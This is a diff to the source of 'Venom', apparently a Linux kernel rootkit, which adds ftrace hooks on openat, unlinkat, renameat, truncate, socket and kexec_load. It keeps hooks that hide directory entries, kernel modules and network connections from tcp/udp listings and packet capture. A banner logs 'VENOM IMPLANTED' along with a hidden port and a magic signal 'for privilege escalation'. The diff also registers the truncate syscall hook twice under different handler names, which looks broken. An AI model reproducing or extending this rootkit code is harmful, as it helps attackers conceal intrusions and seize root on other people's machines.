@@ -15,7 +15,8 @@
 #include "hooks/ioctl.h"
 #include "hooks/insmod.h"
 #include "hooks/network.h"
-#include "hooks/truncate.h"
+#include "hooks/ftruncate.h"
+
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Trevohack");
@@ -59,7 +60,14 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_move_mount", hook_move_mount, &orig_move_mount),
     HOOK("__x64_sys_getdents64", hooked_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hooked_getdents, &orig_getdents),
-    
+    HOOK("__x64_sys_truncate", hook_truncate, &orig_truncate),
+    HOOK("__x64_sys_openat", hooked_openat, &orig_openat),
+    HOOK("__x64_sys_unlinkat", hooked_unlinkat, &orig_unlinkat),
+    HOOK("__x64_sys_renameat", hooked_renameat, &orig_renameat),
+    HOOK("__x64_sys_truncate", hooked_truncate, &orig_truncate),    
+    HOOK("__x64_sys_socket", hooked_socket, &orig_socket),
+    HOOK("__x64_sys_kexec_load", hooked_kexec_load, &orig_kexec_load),
+
     HOOK("__x64_sys_init_module", hooked_init_module, &orig_init_module),
     HOOK("__x64_sys_finit_module", hooked_finit_module, &orig_finit_module),
     HOOK("__x64_sys_delete_module", hooked_delete_module, &orig_delete_module),
@@ -73,8 +81,7 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("udp4_seq_show", hooked_udp4_seq_show, &orig_udp4_seq_show),
     HOOK("udp6_seq_show", hooked_udp6_seq_show, &orig_udp6_seq_show),
     HOOK("tpacket_rcv", hooked_tpacket_rcv, &orig_tpacket_rcv),
-    HOOK("__x64_sys_truncate", hook_truncate, &orig_truncate),
-    HOOK("__x64_sys_ftruncate", hook_ftruncate, &orig_ftruncate),
+    
 };
 
 
@@ -115,17 +122,17 @@ notrace static int __init venom_init(void) {
     }
     
 
-    TLOG_INF("=============================================================================\n");
-    TLOG_INF("=                                                                           =\n");
-    TLOG_INF("=                          [ VENOM IMPLANTED ]                              =\n");
-    TLOG_INF("=                          Made by Trevohack                                =\n");
-    TLOG_INF("=                                                                           =\n");
-    TLOG_INF("=============================================================================\n"); 
+    TLOG_INF("╔════════════════════════════════════════════════════════════════════════════╗\n");
+    TLOG_INF("║                                                                            ║\n");
+    TLOG_INF("║   ░░░░░░░░░░░░░░░░  [  V E N O M   I M P L A N T E D  ]  ░░░░░░░░░░░       ║\n");
+    TLOG_INF("║                    ──   trev • devil • obscurity  ──                       ║\n");
+    TLOG_INF("║                                                                            ║\n");
+    TLOG_INF("╚════════════════════════════════════════════════════════════════════════════╝\n");
 
     TLOG_INF("[VENOM] All protection systems active\n");
     TLOG_INF("[VENOM] Protected port: %d\n", HIDDEN_PORT);
-    TLOG_INF("[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL); 
-    
+    TLOG_INF("[VENOM] Magic signal: %d (for privilege escalation)\n", MAGIC_KILL_SIGNAL);
+
     
     return 0;
 }
@@ -137,5 +144,4 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
-
 
